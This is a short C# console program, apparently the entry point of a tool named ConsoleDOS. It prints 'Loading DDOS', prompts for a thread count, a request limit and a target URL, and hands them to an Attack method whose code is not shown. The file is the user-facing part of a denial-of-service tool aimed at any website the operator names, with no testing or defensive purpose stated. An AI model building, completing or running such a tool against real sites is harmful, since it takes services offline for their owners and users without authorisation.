using System.Net;

namespace ConsoleDOS
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            bool _isRunning = true;

            while (_isRunning)
            {
                Console.WriteLine("Loading DDOS. Please, wait...");
                StartAttack();
                Console.WriteLine("Do you want to start over? y/n:");
                if (Console.ReadKey().Key == ConsoleKey.N) { _isRunning = false; }
            }
            
        }

        static void StartAttack()
        {
            Console.Clear();

            Placeholder placeholder = new Placeholder();
            placeholder.WriteASCII();

            Parser parser = new Parser();

            Console.Write("Set Humber of Threads: ");
            string temp = Console.ReadLine();

            parser.SetThreads(int.Parse(temp));

            Console.Write("Set Humber of Limits: ");
            temp = Console.ReadLine();

            parser.SetLimits(int.Parse(temp));

            Console.Write("URL: ");
            temp = Console.ReadLine();

            parser.Attack(temp, parser.GetLimits(), parser.GetThreads());
        }
    }
}